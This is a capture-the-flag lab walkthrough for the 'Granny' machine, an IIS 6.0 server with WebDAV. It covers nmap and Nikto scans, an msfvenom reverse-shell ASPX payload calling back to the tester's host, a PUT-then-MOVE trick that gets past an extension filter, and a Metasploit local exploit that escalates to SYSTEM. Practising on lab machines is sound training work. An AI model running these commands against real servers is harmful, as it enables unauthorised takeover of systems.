# Granny

## Information Gathering
Granny<br>
10.10.10.15<br>

Software Version
- MicrosoftOfficeWebServer 5.0_Pub
- Microsoft-IIS/6.0

## Enumeration
Of course start with your nmap:
```bash
# Nmap 7.92 scan initiated Sun Feb 20 14:51:07 2022 as: nmap -p- -A -oN nmap/all_ports.nmap 10.10.10.15
Nmap scan report for 10.10.10.15
Host is up (0.027s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
|_http-server-header: Microsoft-IIS/6.0
| http-webdav-scan: 
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|   Server Date: Sun, 20 Feb 2022 20:00:12 GMT
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
|   Server Type: Microsoft-IIS/6.0
|_  WebDAV type: Unknown
|_http-title: Under Construction
| http-methods: 
|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2003|2008|XP|2000 (90%)
OS CPE: cpe:/o:microsoft:windows_server_2003::sp2 cpe:/o:microsoft:windows_server_2008::sp2 cpe:/o:microsoft:windows_xp::sp3 cpe:/o:microsoft:windows_2000::sp4
Aggressive OS guesses: Microsoft Windows Server 2003 SP2 (90%), Microsoft Windows Server 2003 SP1 or SP2 (89%), Microsoft Windows 2003 SP2 (89%), Microsoft Windows Server 2008 Enterprise SP2 (89%), Microsoft Windows XP SP3 (89%), Microsoft Windows XP (87%), Microsoft Windows 2000 SP4 or Windows XP Professional SP1 (87%), Microsoft Windows 2000 SP4 (85%), Microsoft Windows Server 2003 SP1 - SP2 (85%), Microsoft Windows XP SP2 or Windows Server 2003 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   26.70 ms 10.10.14.1
2   26.71 ms 10.10.10.15

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Feb 20 14:53:11 2022 -- 1 IP address (1 host up) scanned in 123.86 seconds

```
I also run a Nikto scan:
```bash
- Nikto v2.1.6/2.1.5
+ Target Host: 10.10.10.15
+ Target Port: 80
+ GET Retrieved microsoftofficewebserver header: 5.0_Pub
+ GET Retrieved x-powered-by header: ASP.NET
+ GET The anti-clickjacking X-Frame-Options header is not present.
+ GET The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ GET Uncommon header 'microsoftofficewebserver' found, with contents: 5.0_Pub
+ GET The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ GET Retrieved x-aspnet-version header: 1.1.4322
+ OSVDB-397: PUT HTTP method 'PUT' allows clients to save files on the web server.
+ OSVDB-5646: DELETE HTTP method 'DELETE' allows clients to delete files on the web server.
+ OPTIONS Retrieved dasl header: <DAV:sql>
+ OPTIONS Retrieved dav header: 1, 2
+ OPTIONS Retrieved ms-author-via header: MS-FP/4.0,DAV
+ OPTIONS Uncommon header 'ms-author-via' found, with contents: MS-FP/4.0,DAV
+ OPTIONS Allowed HTTP Methods: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH 
+ OSVDB-5646: GET HTTP method ('Allow' Header): 'DELETE' may allow clients to remove files on the web server.
+ OSVDB-397: GET HTTP method ('Allow' Header): 'PUT' method could allow clients to save files on the web server.
+ OSVDB-5647: GET HTTP method ('Allow' Header): 'MOVE' may allow clients to change file locations on the web server.
+ OPTIONS Public HTTP Methods: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH 
+ OSVDB-5646: GET HTTP method ('Public' Header): 'DELETE' may allow clients to remove files on the web server.
+ OSVDB-397: GET HTTP method ('Public' Header): 'PUT' method could allow clients to save files on the web server.
+ OSVDB-5647: GET HTTP method ('Public' Header): 'MOVE' may allow clients to change file locations on the web server.
+ OPTIONS WebDAV enabled (MKCOL PROPPATCH COPY UNLOCK PROPFIND SEARCH LOCK listed as allowed)
+ OSVDB-13431: PROPFIND PROPFIND HTTP verb may show the servers internal IP address: http://granny/_vti_bin/_vti_aut/author.dll
+ OSVDB-396: GET /_vti_bin/shtml.exe: Attackers may be able to crash FrontPage by requesting a DOS device, like shtml.exe/aux.htm -- a DoS was not attempted.
+ OSVDB-3233: GET /postinfo.html: Microsoft FrontPage default file found.
+ OSVDB-3233: GET /_private/: FrontPage directory found.
+ OSVDB-3233: GET /_vti_bin/: FrontPage directory found.
+ OSVDB-3233: GET /_vti_inf.html: FrontPage/SharePoint is installed and reveals its version number (check HTML source for more information).
+ OSVDB-3300: GET /_vti_bin/: shtml.exe/shtml.dll is available remotely. Some versions of the Front Page ISAPI filter are vulnerable to a DOS (not attempted).
+ OSVDB-3500: GET /_vti_bin/fpcount.exe: Frontpage counter CGI has been found. FP Server version 97 allows remote users to execute arbitrary system commands, though a vulnerability in this version could not be confirmed. CVE-1999-1376. BID-2252.
+ OSVDB-67: POST /_vti_bin/shtml.dll/_vti_rpc: The anonymous FrontPage user is revealed through a crafted POST.
+ GET /_vti_bin/_vti_adm/admin.dll: FrontPage/SharePoint file found.

```

## Exploitation
This server has the vulnerable PUT HTTP verb enabled. This allows for an attacker to upload a file to the server. Looking at what scripting language is running on this server (by looking at the HTTP headers) it appears the server is powered by ASP.NET. <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods/PUT">Here</a> is how to use PUT. I first test to see whether I can upload files:
```bash
curl -X PUT 'http://10.10.10.15/shell.txt' --data-binary @shell.txt
```
I am able to hit this file.<br>
Next, I generate a payload using msfvenom:
```bash
msfvenom -p windows/meterpreter/reverse_tcp -lhost 10.10.14.122 -lport 1337 -f aspx -o shell.aspx
```
You can upload the file using a proxy like Burp but I use cURL.
```bash
curl -X PUT 'http://10.10.10.15/shell.aspx' --data-binary @shell.aspx
```
However, this returns a 403 - Forbidden code. There is probably something blocking scripting files from being uploaded. Luckily, the MOVE HTTP verb is enabled which allows me to rename files. <a href="https://docs.microsoft.com/en-us/previous-versions/office/developer/exchange-server-2003/aa142926(v=exchg.65)">Here</a> is how to use MOVE. I rename the file to have a .txt extension and reupload the file then use MOVE to rename the file to have the .aspx extension.
```bash
curl -X PUT 'http://10.10.10.15/shell.txt' --data-binary @shell.txt
curl -X MOVE 'http://10.10.10.15/shell.txt' -H 'Destination: http://10.10.10.15/shell.aspx'
```
Begin the Metasploit listener <b>windows/meterpreter/reverse_tcp</b> and server shell.aspx to get a web shell.
```
meterpreter > getuid
Server username: NT AUTHORITY\NETWORK SERVICE
```

## Privilege Escalation
We start out as a Network Service. A user with low privileges. I background the prcoess and load <b>post/multi/recon/local_exploit_suggester</b> and run it.
```
[*] 10.10.10.15 - Collecting local exploits for x86/windows...
[*] 10.10.10.15 - 38 exploit checks are being tried...
[+] 10.10.10.15 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
[+] 10.10.10.15 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable. -
[+] 10.10.10.15 - exploit/windows/local/ms14_070_tcpip_ioctl: The target appears to be vulnerable.
[+] 10.10.10.15 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.10.15 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated. -
[+] 10.10.10.15 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable. -
[+] 10.10.10.15 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable. -
[*] Post module execution completed
```
The first exploit that worked for me was <b>exploit/windows/local/ms14_058_track_popup_menu</b>. This gives me an Administrator shell.
```
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```